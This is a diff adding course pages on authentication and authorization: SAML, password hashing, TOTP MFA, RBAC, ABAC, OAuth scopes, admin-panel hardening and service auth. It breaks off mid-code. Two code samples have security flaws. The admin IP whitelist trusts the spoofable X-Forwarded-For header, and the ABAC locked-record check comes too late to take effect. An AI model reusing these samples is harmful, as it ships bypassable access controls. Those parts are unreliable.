+  <span class="s">"email"</span>: <span class="s">"alice@gmail.com"</span>,
+  <span class="s">"email_verified"</span>: <span class="n">true</span>,
+  <span class="s">"name"</span>: <span class="s">"Alice Smith"</span>,
+  <span class="s">"picture"</span>: <span class="s">"https://..."</span>
+}</div>
+
+  <h2>OAuth 2.0 vs OIDC vs SAML</h2>
+  <div class="tw"><table>
+    <thead><tr><th>Protocol</th><th>Purpose</th><th>Token format</th><th>Use today?</th></tr></thead>
+    <tbody>
+      <tr><td>OAuth 2.0</td><td>Authorization only (access delegation)</td><td>Opaque or JWT</td><td><span class="pill p3">Yes — everywhere</span></td></tr>
+      <tr><td>OpenID Connect</td><td>Authentication + Authorization</td><td>JWT (ID Token)</td><td><span class="pill p3">Yes — modern standard</span></td></tr>
+      <tr><td>SAML 2.0</td><td>Authentication (enterprise SSO)</td><td>XML assertions</td><td><span class="pill p4">Legacy enterprise only</span></td></tr>
+      <tr><td>WS-Federation</td><td>Enterprise SSO (Microsoft)</td><td>XML</td><td><span class="pill p5">Very legacy</span></td></tr>
+    </tbody>
+  </table></div>
+</section>
+
+<!-- ═══ SAML ═══ -->
+<section id="sec-saml" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 20 · SAML 2.0</div>
+    <h1 class="htitle">SAML <span>2.0</span></h1>
+    <p class="hsub">Security Assertion Markup Language — the enterprise SSO standard. Used when companies need employees to log into your app using their corporate identity (Active Directory, Okta, Azure AD).</p>
+  </div>
+  <div class="callout q4"><strong>Should you implement SAML?</strong> Only if enterprise customers require it. For new projects, use OpenID Connect — it achieves the same goals with far less XML complexity. If you're on Azure, use Azure AD / Entra ID with OIDC.</div>
+
+  <div class="g2">
+    <div class="card ca4"><div class="ct">SAML key concepts</div><div class="cb"><strong>Identity Provider (IdP):</strong> The company's auth server (Okta, Azure AD, ADFS). Authenticates users.<br><br><strong>Service Provider (SP):</strong> Your app. Trusts assertions from the IdP.<br><br><strong>Assertion:</strong> XML document signed by IdP, states who the user is and what roles they have.</div></div>
+    <div class="card ca7"><div class="ct">SAML vs OIDC</div><div class="cb"><strong>SAML:</strong> XML-based, complex, but universally supported in enterprise. Required by many large companies (banks, healthcare).<br><br><strong>OIDC:</strong> JSON/JWT-based, modern, simple to implement. Preferred for new integrations.<br><br><strong>Rule:</strong> If your enterprise customer says "we use Okta/Azure AD/ADFS," use their SSO. Azure AD supports both SAML and OIDC.</div></div>
+  </div>
+
+  <div class="clabel">Django SAML (python3-saml)</div>
+  <div class="code">pip install python3-saml
+
+<span class="c"># views.py — SAML SSO login</span>
+<span class="k">from</span> onelogin.saml2.auth <span class="k">import</span> OneLogin_Saml2_Auth
+
+<span class="k">def</span> <span class="f">saml_login</span>(request):
+    auth = <span class="f">OneLogin_Saml2_Auth</span>(request, custom_base_path=settings.SAML_FOLDER)
+    <span class="k">return</span> <span class="f">HttpResponseRedirect</span>(auth.<span class="f">login</span>())
+
+<span class="k">def</span> <span class="f">saml_callback</span>(request):
+    auth = <span class="f">OneLogin_Saml2_Auth</span>(request, custom_base_path=settings.SAML_FOLDER)
+    auth.<span class="f">process_response</span>()
+    <span class="k">if not</span> auth.<span class="f">is_authenticated</span>():
+        <span class="k">return</span> <span class="f">HttpResponse</span>(<span class="s">"SAML auth failed"</span>, status=<span class="n">401</span>)
+    email = auth.<span class="f">get_attribute</span>(<span class="s">"email"</span>)[<span class="n">0</span>]
+    user, _ = User.objects.<span class="f">get_or_create</span>(email=email)
+    <span class="f">login</span>(request, user)
+    <span class="k">return</span> <span class="f">redirect</span>(<span class="s">"/dashboard"</span>)</div>
+</section>
+
+<!-- ═══ PASSWORD HASHING ═══ -->
+<section id="sec-password-hashing" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 21 · Passwords</div>
+    <h1 class="htitle">Password <span>Hashing</span></h1>
+    <p class="hsub">Passwords must never be stored in plaintext or with reversible encryption. Proper password hashing with salt is mandatory. Here's everything you need to know.</p>
+  </div>
+
+  <h2>Why you must hash passwords</h2>
+  <div class="callout q5"><strong>Every major data breach reveals plaintext passwords from companies that "stored them securely."</strong> If your DB is leaked, hashed passwords give your users time to change passwords elsewhere before an attacker cracks them. Plaintext = instant compromise of every account.</div>
+
+  <h2>Hashing algorithms comparison</h2>
+  <div class="tw"><table>
+    <thead><tr><th>Algorithm</th><th>Speed</th><th>Security</th><th>Use?</th><th>Notes</th></tr></thead>
+    <tbody>
+      <tr><td>MD5</td><td>Extremely fast</td><td><span class="pill p5">Broken</span></td><td><span class="pill p5">Never</span></td><td>Designed for checksums, not passwords. GPU cracks millions/sec.</td></tr>
+      <tr><td>SHA-256</td><td>Very fast</td><td><span class="pill p5">Weak for passwords</span></td><td><span class="pill p5">Never</span></td><td>Too fast — brute force is trivial. Only for checksums.</td></tr>
+      <tr><td>bcrypt</td><td>Slow (configurable)</td><td><span class="pill p3">Strong</span></td><td><span class="pill p3">Yes</span></td><td>Industry standard for 25 years. Auto-salted. Use cost factor 12+.</td></tr>
+      <tr><td>Argon2id</td><td>Slow + memory-hard</td><td><span class="pill p3">Strongest</span></td><td><span class="pill p3">Yes — preferred</span></td><td>Password Hashing Competition winner. Resistant to GPU and ASIC attacks.</td></tr>
+      <tr><td>scrypt</td><td>Slow + memory-hard</td><td><span class="pill p3">Strong</span></td><td><span class="pill p3">Yes</span></td><td>Good alternative to Argon2. Used by Litecoin.</td></tr>
+      <tr><td>PBKDF2</td><td>Slow</td><td><span class="pill p4">Acceptable</span></td><td><span class="pill p4">Acceptable</span></td><td>NIST-approved, used in Django. Not as GPU-resistant as Argon2.</td></tr>
+    </tbody>
+  </table></div>
+
+  <div class="clabel">password_utils.py — FastAPI with passlib</div>
+  <div class="code"><span class="k">from</span> passlib.context <span class="k">import</span> CryptContext
+
+<span class="c"># Use bcrypt (or argon2 with: pip install argon2-cffi)</span>
+pwd_context = <span class="f">CryptContext</span>(schemes=[<span class="s">"bcrypt"</span>], deprecated=<span class="s">"auto"</span>)
+<span class="c"># For Argon2: CryptContext(schemes=["argon2"], deprecated="auto")</span>
+
+<span class="k">def</span> <span class="f">hash_password</span>(password: str) -> str:
+    <span class="k">return</span> pwd_context.<span class="f">hash</span>(password)
+    <span class="c"># Result: "$2b$12$EixZaYVK1fsbw1ZfbX3OXe.PkMkP6fQH..."</span>
+    <span class="c"># Includes: algorithm, cost factor, salt, hash — all in one string</span>
+
+<span class="k">def</span> <span class="f">verify_password</span>(plain: str, hashed: str) -> bool:
+    <span class="k">return</span> pwd_context.<span class="f">verify</span>(plain, hashed)
+
+<span class="c"># NEVER do this:</span>
+<span class="c"># import hashlib</span>
+<span class="c"># hashlib.md5(password.encode()).hexdigest()  ← completely insecure</span>
+<span class="c"># hashlib.sha256(password.encode()).hexdigest()  ← better but still wrong</span></div>
+
+  <div class="clabel">Django — password hashing (automatic)</div>
+  <div class="code"><span class="c"># Django hashes automatically with PBKDF2 by default</span>
+<span class="c"># To use Argon2 (recommended):</span>
+
+<span class="c"># 1. pip install argon2-cffi</span>
+
+<span class="c"># 2. settings.py</span>
+PASSWORD_HASHERS = [
+    <span class="s">'django.contrib.auth.hashers.Argon2PasswordHasher'</span>,  <span class="c"># Preferred</span>
+    <span class="s">'django.contrib.auth.hashers.BCryptSHA256PasswordHasher'</span>,
+    <span class="s">'django.contrib.auth.hashers.PBKDF2PasswordHasher'</span>,
+]
+<span class="c"># Django automatically upgrades old hashes on next login</span>
+
+<span class="c"># 3. Usage</span>
+user = User.objects.<span class="f">create_user</span>(username=<span class="s">'alice'</span>, password=<span class="s">'secret'</span>)
+<span class="c"># user.password = "argon2$argon2id$v=19$..."  ← hashed automatically</span></div>
+</section>
+
+<!-- ═══ MFA ═══ -->
+<section id="sec-mfa" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 22 · MFA</div>
+    <h1 class="htitle">MFA · 2FA · <span>TOTP</span></h1>
+    <p class="hsub">Multi-Factor Authentication adds a second layer of identity proof. Even if a password is stolen, the attacker can't log in without the second factor.</p>
+  </div>
+
+  <div class="g3">
+    <div class="mini"><div class="mt" style="color:var(--a5)">Something you know</div><div class="mb">Password, PIN, security questions. Single factor — can be stolen or guessed.</div></div>
+    <div class="mini"><div class="mt" style="color:var(--a1)">Something you have</div><div class="mb">TOTP app (Google Authenticator), SMS, hardware key (YubiKey). Time-limited, device-specific.</div></div>
+    <div class="mini"><div class="mt" style="color:var(--a3)">Something you are</div><div class="mb">Fingerprint, face ID, voice. Biometric — hardest to steal but requires hardware.</div></div>
+  </div>
+
+  <h2>TOTP — Time-based One-Time Passwords (Google Authenticator)</h2>
+  <div class="steps">
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(0,212,255,.2);color:var(--a1)">1</div><div class="sv2"></div></div><div class="sc"><div class="stitle">Generate a secret for the user</div><div class="sbody">Server generates a random 160-bit base32 secret. This is stored in your DB (encrypted) and shared with the user's auth app via QR code.</div></div></div>
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(16,185,129,.2);color:var(--a3)">2</div><div class="sv2"></div></div><div class="sc"><div class="stitle">User scans QR code in Google Authenticator</div><div class="sbody">The QR code encodes: <code>otpauth://totp/YourApp:alice@example.com?secret=BASE32SECRET&issuer=YourApp</code>. The app stores the secret and computes a 6-digit code every 30 seconds.</div></div></div>
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(245,158,11,.2);color:var(--a4)">3</div><div class="sv2"></div></div><div class="sc"><div class="stitle">On login, user provides TOTP code</div><div class="sbody">After password check succeeds, ask for 6-digit TOTP. Server recomputes <code>HOTP(secret, floor(current_time / 30))</code> and compares. Allow ±1 window for clock drift.</div></div></div>
+  </div>
+
+  <div class="clabel">mfa_utils.py — TOTP with pyotp</div>
+  <div class="code">pip install pyotp qrcode[pil]
+
+<span class="k">import</span> pyotp, qrcode, base64
+<span class="k">from</span> io <span class="k">import</span> BytesIO
+
+<span class="c"># ─── Setup MFA for a user ──────────────────────────────────────────────</span>
+<span class="k">def</span> <span class="f">setup_mfa</span>(user_email: str) -> dict:
+    secret = pyotp.<span class="f">random_base32</span>()   <span class="c"># Generate secret</span>
+    totp = pyotp.<span class="f">TOTP</span>(secret)
+    uri = totp.<span class="f">provisioning_uri</span>(name=user_email, issuer_name=<span class="s">"YourApp"</span>)
+
+    <span class="c"># Generate QR code image</span>
+    qr = qrcode.<span class="f">make</span>(uri)
+    buffer = <span class="f">BytesIO</span>()
+    qr.<span class="f">save</span>(buffer, format=<span class="s">"PNG"</span>)
+    qr_b64 = base64.<span class="f">b64encode</span>(buffer.<span class="f">getvalue</span>()).<span class="f">decode</span>()
+
+    <span class="k">return</span> {<span class="s">"secret"</span>: secret, <span class="s">"qr_code"</span>: <span class="s">f"data:image/png;base64,{qr_b64}"</span>}
+
+<span class="c"># ─── Verify TOTP code from user ────────────────────────────────────────</span>
+<span class="k">def</span> <span class="f">verify_totp</span>(secret: str, code: str) -> bool:
+    totp = pyotp.<span class="f">TOTP</span>(secret)
+    <span class="k">return</span> totp.<span class="f">verify</span>(code, valid_window=<span class="n">1</span>)  <span class="c"># Allow 30s clock drift</span>
+
+<span class="c"># ─── FastAPI MFA login endpoint ────────────────────────────────────────</span>
+<span class="f">@router.post</span>(<span class="s">"/auth/verify-mfa"</span>)
+<span class="k">async def</span> <span class="f">verify_mfa</span>(user_id: int, code: str, db = <span class="f">Depends</span>(get_db)):
+    user = db.<span class="f">query</span>(User).<span class="f">get</span>(user_id)
+    <span class="k">if not</span> <span class="f">verify_totp</span>(user.mfa_secret, code):
+        <span class="k">raise</span> <span class="f">HTTPException</span>(status_code=<span class="n">401</span>, detail=<span class="s">"Invalid MFA code"</span>)
+    <span class="c"># Issue full access token now that both factors are verified</span>
+    token = <span class="f">create_access_token</span>({<span class="s">"sub"</span>: str(user.id), <span class="s">"mfa_verified"</span>: <span class="n">True</span>})
+    <span class="k">return</span> {<span class="s">"access_token"</span>: token}</div>
+</section>
+
+<!-- ═══ RBAC ═══ -->
+<section id="sec-rbac" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 23 · Authorization</div>
+    <h1 class="htitle">RBAC — <span>Role-Based Access Control</span></h1>
+    <p class="hsub">RBAC assigns permissions to roles, then assigns roles to users. The most common authorization model — simple, predictable, and easy to audit.</p>
+  </div>
+
+  <h2>RBAC model</h2>
+  <div class="layers">
+    <div class="layer" style="border-color:var(--a5);background:rgba(244,63,94,.04)"><div class="lname" style="color:var(--a5)">User → has Role(s)</div><div class="ldesc">Alice is a "manager". Bob is a "user". Carol is a "superadmin". Users can have multiple roles.</div></div>
+    <div style="text-align:center;color:var(--t3);font-size:11px;padding:4px;font-family:'JetBrains Mono',monospace">↓</div>
+    <div class="layer" style="border-color:var(--a1);background:rgba(0,212,255,.04)"><div class="lname" style="color:var(--a1)">Role → has Permissions</div><div class="ldesc">"manager" can: read_users, write_reports, approve_requests. "user" can: read_own_data, submit_requests.</div></div>
+    <div style="text-align:center;color:var(--t3);font-size:11px;padding:4px;font-family:'JetBrains Mono',monospace">↓</div>
+    <div class="layer" style="border-color:var(--a3);background:rgba(16,185,129,.04)"><div class="lname" style="color:var(--a3)">Permission → guards Resource</div><div class="ldesc">Endpoint checks: "does the current user's role have permission X?" If yes, allow. If no, 403.</div></div>
+  </div>
+
+  <div class="clabel">rbac_fastapi.py — Complete RBAC implementation</div>
+  <div class="code"><span class="k">from</span> enum <span class="k">import</span> Enum
+<span class="k">from</span> functools <span class="k">import</span> wraps
+
+<span class="c"># ─── Define roles and permissions ─────────────────────────────────────</span>
+<span class="k">class</span> <span class="f">Role</span>(str, Enum):
+    USER = <span class="s">"user"</span>
+    MANAGER = <span class="s">"manager"</span>
+    ADMIN = <span class="s">"admin"</span>
+    SUPERADMIN = <span class="s">"superadmin"</span>
+
+ROLE_PERMISSIONS = {
+    Role.USER: {<span class="s">"read:own_data"</span>, <span class="s">"write:own_data"</span>},
+    Role.MANAGER: {<span class="s">"read:own_data"</span>, <span class="s">"write:own_data"</span>, <span class="s">"read:team_data"</span>, <span class="s">"write:reports"</span>},
+    Role.ADMIN: {<span class="s">"read:all"</span>, <span class="s">"write:all"</span>, <span class="s">"manage:users"</span>},
+    Role.SUPERADMIN: {<span class="s">"read:all"</span>, <span class="s">"write:all"</span>, <span class="s">"manage:users"</span>, <span class="s">"manage:system"</span>},
+}
+
+<span class="k">def</span> <span class="f">has_permission</span>(user_role: str, permission: str) -> bool:
+    role = Role(user_role)
+    <span class="k">return</span> permission <span class="k">in</span> ROLE_PERMISSIONS.<span class="f">get</span>(role, <span class="f">set</span>())
+
+<span class="c"># ─── Dependency factory ────────────────────────────────────────────────</span>
+<span class="k">def</span> <span class="f">require_permission</span>(permission: str):
+    <span class="k">async def</span> <span class="f">check</span>(current_user = <span class="f">Depends</span>(get_current_user)):
+        <span class="k">if not</span> <span class="f">has_permission</span>(current_user.role, permission):
+            <span class="k">raise</span> <span class="f">HTTPException</span>(status_code=<span class="n">403</span>,
+                detail=<span class="s">f"Permission required: {permission}"</span>)
+        <span class="k">return</span> current_user
+    <span class="k">return</span> check
+
+<span class="c"># ─── Usage ─────────────────────────────────────────────────────────────</span>
+<span class="f">@app.get</span>(<span class="s">"/api/admin/users"</span>)
+<span class="k">async def</span> <span class="f">list_users</span>(user = <span class="f">Depends</span>(<span class="f">require_permission</span>(<span class="s">"manage:users"</span>))):
+    <span class="k">return</span> <span class="f">get_all_users</span>()
+
+<span class="f">@app.get</span>(<span class="s">"/api/reports"</span>)
+<span class="k">async def</span> <span class="f">get_reports</span>(user = <span class="f">Depends</span>(<span class="f">require_permission</span>(<span class="s">"write:reports"</span>))):
+    <span class="k">return</span> <span class="f">get_reports_for_user</span>(user.id)</div>
+</section>
+
+<!-- ═══ ABAC ═══ -->
+<section id="sec-abac" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 24 · Authorization</div>
+    <h1 class="htitle">ABAC — <span>Attribute-Based Access Control</span></h1>
+    <p class="hsub">ABAC grants access based on attributes of the user, resource, and environment. More flexible than RBAC — you can express complex rules like "managers can only edit records in their own department."</p>
+  </div>
+
+  <div class="cmp">
+    <div class="cmpc"><h3 style="color:var(--a2)">RBAC (Role-Based)</h3>
+      <ul>
+        <li>Simple: user → role → permission</li>
+        <li>Easy to reason about and audit</li>
+        <li>Struggles with fine-grained rules</li>
+        <li>"Admin can edit any user"</li>
+        <li>Good for: most apps, admin panels</li>
+      </ul>
+    </div>
+    <div class="cmpc"><h3 style="color:var(--a3)">ABAC (Attribute-Based)</h3>
+      <ul>
+        <li>Complex: policy rules on user + resource attributes</li>
+        <li>More flexible but harder to debug</li>
+        <li>Fine-grained: "manager can edit own team's records"</li>
+        <li>Considers context: time, IP, resource state</li>
+        <li>Good for: multi-tenant SaaS, healthcare, banking</li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="clabel">abac_example.py — Attribute-based check</div>
+  <div class="code"><span class="k">def</span> <span class="f">can_edit_record</span>(user, record) -> bool:
+    <span class="c"># ABAC policy: user can edit record if...</span>
+    <span class="k">if</span> user.role == <span class="s">"superadmin"</span>:
+        <span class="k">return True</span>                                     <span class="c"># Superadmin can do anything</span>
+    <span class="k">if</span> record.owner_id == user.id:
+        <span class="k">return True</span>                                     <span class="c"># Owner can edit own record</span>
+    <span class="k">if</span> user.role == <span class="s">"manager"</span> <span class="k">and</span> record.department == user.department:
+        <span class="k">return True</span>                                     <span class="c"># Manager can edit team's records</span>
+    <span class="k">if</span> record.status == <span class="s">"locked"</span>:
+        <span class="k">return False</span>                                    <span class="c"># No one edits locked records</span>
+    <span class="k">return False</span>
+
+<span class="c"># Use in FastAPI endpoint</span>
+<span class="f">@app.put</span>(<span class="s">"/api/records/{record_id}"</span>)
+<span class="k">async def</span> <span class="f">update_record</span>(record_id: int, current_user = <span class="f">Depends</span>(get_current_user), db = <span class="f">Depends</span>(get_db)):
+    record = db.<span class="f">query</span>(Record).<span class="f">get</span>(record_id)
+    <span class="k">if not</span> <span class="f">can_edit_record</span>(current_user, record):
+        <span class="k">raise</span> <span class="f">HTTPException</span>(status_code=<span class="n">403</span>, detail=<span class="s">"Not authorized to edit this record"</span>)
+    ...</div>
+</section>
+
+<!-- ═══ PERMISSIONS ═══ -->
+<section id="sec-permissions" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 25 · Authorization</div>
+    <h1 class="htitle">Permissions &amp; <span>Scopes</span></h1>
+    <p class="hsub">Scopes are OAuth's granular permission system. Permissions are general authorization units. Both implement the principle of least privilege.</p>
+  </div>
+
+  <h2>OAuth Scopes</h2>
+  <p>Scopes declare exactly what access a token grants. Clients request only what they need. Users see and consent to each scope explicitly.</p>
+  <div class="tw"><table>
+    <thead><tr><th>Scope</th><th>Grants access to</th><th>OIDC standard?</th></tr></thead>
+    <tbody>
+      <tr><td>openid</td><td>Authentication — ID token with sub claim</td><td><span class="pill p3">Yes</span></td></tr>
+      <tr><td>profile</td><td>User's name, picture, locale</td><td><span class="pill p3">Yes</span></td></tr>
+      <tr><td>email</td><td>User's email address</td><td><span class="pill p3">Yes</span></td></tr>
+      <tr><td>read:users</td><td>Custom — list users (your app)</td><td><span class="pill p5">No — custom</span></td></tr>
+      <tr><td>write:reports</td><td>Custom — create/edit reports</td><td><span class="pill p5">No — custom</span></td></tr>
+      <tr><td>admin:all</td><td>Custom — full admin access</td><td><span class="pill p5">No — custom</span></td></tr>
+    </tbody>
+  </table></div>
+
+  <div class="clabel">Scopes in JWT payload</div>
+  <div class="code">{
+  <span class="s">"sub"</span>: <span class="s">"user_123"</span>,
+  <span class="s">"scope"</span>: <span class="s">"read:users write:reports"</span>,   <span class="c">// Space-separated scopes</span>
+  <span class="s">"exp"</span>: <span class="n">1700000000</span>
+}
+
+<span class="c"># FastAPI scope check</span>
+<span class="k">def</span> <span class="f">require_scope</span>(scope: str):
+    <span class="k">async def</span> <span class="f">check</span>(token: str = <span class="f">Depends</span>(oauth2_scheme)):
+        payload = <span class="f">decode_token</span>(token)
+        token_scopes = payload.<span class="f">get</span>(<span class="s">"scope"</span>, <span class="s">""</span>).<span class="f">split</span>()
+        <span class="k">if</span> scope <span class="k">not in</span> token_scopes:
+            <span class="k">raise</span> <span class="f">HTTPException</span>(status_code=<span class="n">403</span>, detail=<span class="s">f"Scope required: {scope}"</span>)
+    <span class="k">return</span> check</div>
+</section>
+
+<!-- ═══ ADMIN PANEL ═══ -->
+<section id="sec-admin-panel" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 26 · Admin Panel Security</div>
+    <h1 class="htitle">Admin Panel <span>Authentication</span></h1>
+    <p class="hsub">Admin panels are the highest-value targets in your application. They require multiple layers of protection beyond standard auth.</p>
+  </div>
+
+  <h2>Admin security layers (apply all of them)</h2>
+  <div class="steps">
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(244,63,94,.2);color:var(--a5)">1</div><div class="sv2"></div></div><div class="sc"><div class="stitle">Non-obvious URL</div><div class="sbody">Never use <code>/admin</code>, <code>/dashboard</code>, <code>/management</code>. Use a random, non-guessable path: <code>/x9k2m-control</code>. Security through obscurity isn't a defense by itself, but it eliminates automated scanners.</div></div></div>
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(244,63,94,.2);color:var(--a5)">2</div><div class="sv2"></div></div><div class="sc"><div class="stitle">IP Whitelist via Nginx</div><div class="sbody">Only allow access from your office IP or VPN. In Nginx: <code>allow 203.x.x.x; deny all;</code>. Azure NSG can also block at the firewall level before traffic reaches Nginx.</div></div></div>
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(244,63,94,.2);color:var(--a5)">3</div><div class="sv2"></div></div><div class="sc"><div class="stitle">Separate auth with MFA mandatory</div><div class="sbody">Admin login must require TOTP/MFA. Never allow admin access with just a password. Even if a password is phished, MFA stops the attack.</div></div></div>
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(244,63,94,.2);color:var(--a5)">4</div><div class="sv2"></div></div><div class="sc"><div class="stitle">Short-lived sessions for admin</div><div class="sbody">Admin JWT should expire in 15–30 minutes with no silent refresh. Admin should re-authenticate for sensitive actions. Inactivity timeout: if no action for 10 min, force re-login.</div></div></div>
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(244,63,94,.2);color:var(--a5)">5</div><div class="sv2"></div></div><div class="sc"><div class="stitle">Audit logging — log everything</div><div class="sbody">Log every admin action: who did what to which record at what time from which IP. Store logs separately (write-only from the app). Non-repudiation — admins can't deny their actions.</div></div></div>
+    <div class="step"><div class="sl2"><div class="sdot" style="background:rgba(244,63,94,.2);color:var(--a5)">6</div></div><div class="sc"><div class="stitle">Re-confirm for destructive actions</div><div class="sbody">Deleting users, bulk operations, changing permissions: require password re-entry ("sudo mode") or a second confirmation step. Prevents CSRF and accidental actions.</div></div></div>
+  </div>
+
+  <div class="clabel">admin_security_fastapi.py</div>
+  <div class="code"><span class="k">from</span> fastapi <span class="k">import</span> Request
+<span class="k">import</span> logging
+
+admin_logger = logging.<span class="f">getLogger</span>(<span class="s">"admin_audit"</span>)
+
+<span class="k">async def</span> <span class="f">require_admin</span>(request: Request, current_user = <span class="f">Depends</span>(get_current_user)):
+    <span class="k">if</span> current_user.role <span class="k">not in</span> [<span class="s">"admin"</span>, <span class="s">"superadmin"</span>]:
+        <span class="c"># Log unauthorized admin access attempt</span>
+        admin_logger.<span class="f">warning</span>(<span class="s">f"Unauthorized admin attempt: user={current_user.id} ip={request.client.host}"</span>)
+        <span class="k">raise</span> <span class="f">HTTPException</span>(status_code=<span class="n">403</span>)
+    <span class="k">if not</span> current_user.mfa_verified:
+        <span class="k">raise</span> <span class="f">HTTPException</span>(status_code=<span class="n">403</span>, detail=<span class="s">"MFA required for admin access"</span>)
+    <span class="k">return</span> current_user
+
+<span class="k">def</span> <span class="f">audit_log</span>(action: str, target: str):
+    <span class="k">async def</span> <span class="f">log_action</span>(request: Request, admin = <span class="f">Depends</span>(require_admin)):
+        admin_logger.<span class="f">info</span>(<span class="s">f"ADMIN ACTION: user={admin.id} action={action} target={target} ip={request.client.host}"</span>)
+        <span class="k">return</span> admin
+    <span class="k">return</span> log_action
+
+<span class="f">@app.delete</span>(<span class="s">"/admin/users/{user_id}"</span>)
+<span class="k">async def</span> <span class="f">delete_user</span>(user_id: int, admin = <span class="f">Depends</span>(<span class="f">audit_log</span>(<span class="s">"DELETE_USER"</span>, <span class="s">"users"</span>))):
+    <span class="f">perform_delete</span>(user_id)
+    <span class="k">return</span> {<span class="s">"deleted"</span>: user_id}</div>
+</section>
+
+<!-- ═══ DJANGO ADMIN ═══ -->
+<section id="sec-django-admin" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 27 · Build It</div>
+    <h1 class="htitle">Django Admin <span>Security</span></h1>
+    <p class="hsub">Django's built-in admin is powerful but dangerously exposed by default. Here's how to lock it down.</p>
+  </div>
+
+  <div class="clabel">settings.py — Relocate and harden admin</div>
+  <div class="code"><span class="c"># urls.py — Change admin URL (not /admin/)</span>
+<span class="k">from</span> django.contrib <span class="k">import</span> admin
+urlpatterns = [
+    path(<span class="s">'secret-x9k2m/'</span>, admin.site.urls),  <span class="c"># Non-guessable URL</span>
+]
+
+<span class="c"># admin.py — Custom admin site with extra security</span>
+<span class="k">from</span> django.contrib.admin <span class="k">import</span> AdminSite
+<span class="k">from</span> django.contrib.auth <span class="k">import</span> authenticate
+
+<span class="k">class</span> <span class="f">SecureAdminSite</span>(AdminSite):
+    site_header = <span class="s">"Management"</span>  <span class="c"># Don't expose "Django administration"</span>
+
+    <span class="k">def</span> <span class="f">has_permission</span>(self, request):
+        <span class="c"># Must be superuser AND have MFA verified in session</span>
+        <span class="k">return</span> (
+            request.user.is_active <span class="k">and</span>
+            request.user.is_superuser <span class="k">and</span>
+            request.session.<span class="f">get</span>(<span class="s">'mfa_verified'</span>, <span class="n">False</span>)
+        )</div>
+
+  <div class="clabel">Django admin — IP restriction via middleware</div>
+  <div class="code"><span class="c"># middleware.py</span>
+<span class="k">class</span> <span class="f">AdminIPRestrictionMiddleware</span>:
+    ALLOWED_IPS = [<span class="s">'203.0.113.10'</span>, <span class="s">'10.0.0.0/8'</span>]  <span class="c"># Your IPs</span>
+    ADMIN_PREFIX = <span class="s">'/secret-x9k2m/'</span>
+
+    <span class="k">def</span> <span class="f">__init__</span>(self, get_response):
+        self.get_response = get_response
+
+    <span class="k">def</span> <span class="f">__call__</span>(self, request):
+        <span class="k">if</span> request.path.<span class="f">startswith</span>(self.ADMIN_PREFIX):
+            client_ip = request.META.<span class="f">get</span>(<span class="s">'HTTP_X_FORWARDED_FOR'</span>, request.META[<span class="s">'REMOTE_ADDR'</span>])
+            <span class="k">if not</span> self.<span class="f">_is_allowed</span>(client_ip):
+                <span class="k">from</span> django.http <span class="k">import</span> HttpResponseForbidden
+                <span class="k">return</span> <span class="f">HttpResponseForbidden</span>(<span class="s">"Access denied"</span>)
+        <span class="k">return</span> self.<span class="f">get_response</span>(request)</div>
+</section>
+
+<!-- ═══ SERVICE AUTH ═══ -->
+<section id="sec-service-auth" class="sec">
+  <div class="hero">
+    <div class="hero-eyebrow"><div class="hero-dot"></div>Module 28 · Service Security</div>
+    <h1 class="htitle">Service-to-Service <span>Authentication</span></h1>
+    <p class="hsub">When your FastAPI service calls your Django service, or your chatbot calls your voice agent, they need to authenticate to each other. No users involved — machine-to-machine auth.</p>
+  </div>
+
+  <h2>Methods from simplest to most secure</h2>
+  <div class="providers">
+    <div class="pcard"><div class="pname">Shared Secret</div><div class="ptag" style="background:rgba(0,212,255,.15);color:var(--a1)">Simple</div><div class="pbody">Both services share an environment variable secret. Caller includes it as header. Fast to implement, hard to rotate.</div></div>
+    <div class="pcard"><div class="pname">Per-Service API Keys</div><div class="ptag" style="background:rgba(16,185,129,.15);color:var(--a3)">Recommended</div><div class="pbody">Each service has its own key stored in Azure Key Vault. Easy to rotate individual keys. Audit logs show which service called what.</div></div>
+    <div class="pcard"><div class="pname">JWT (service token)</div><div class="ptag" style="background:rgba(124,58,237,.15);color:var(--a2)">Scalable</div><div class="pbody">Services issue themselves JWTs signed with their private key. Other services verify with the public key. No shared secrets needed.</div></div>
+    <div class="pcard"><div class="pname">mTLS</div><div class="ptag" style="background:rgba(245,158,11,.15);color:var(--a4)">Enterprise</div><div class="pbody">Mutual TLS — both sides present certificates. Used in zero-trust architectures. Managed by service mesh (Istio, Linkerd).</div></div>
+    <div class="pcard"><div class="pname">Azure Managed Identity</div><div class="ptag" style="background:rgba(6,182,212,.15);color:var(--a6)">Azure-native</div><div class="pbody">Azure services authenticate to each other using Azure AD identity. No keys to manage. Best option if you're all-in on Azure.</div></div>
+    <div class="pcard"><div class="pname">OAuth Client Credentials</div><div class="ptag" style="background:rgba(244,63,94,.15);color:var(--a5)">Standard</div><div class="pbody">Service gets access token using client_id + client_secret. Short-lived, scoped tokens. Standard OAuth flow for machine auth.</div></div>
+  </div>
+
+  <div class="clabel">service_client.py — Service JWT pattern</div>
+  <div class="code"><span class="k">import</span> httpx
+<span class="k">from</span> datetime <span class="k">import</span> datetime, timedelta, timezone
+<span class="k">from</span> jose <span class="k">import</span> jwt
+
+SERVICE_SECRET = os.<span class="f">getenv</span>(<span class="s">"SERVICE_SECRET"</span>)
+SERVICE_NAME = <span class="s">"livekit-agent"</span>
+
+<span class="k">def</span> <span class="f">create_service_token</span>() -> str:
+    payload = {
+        <span class="s">"iss"</span>: SERVICE_NAME,
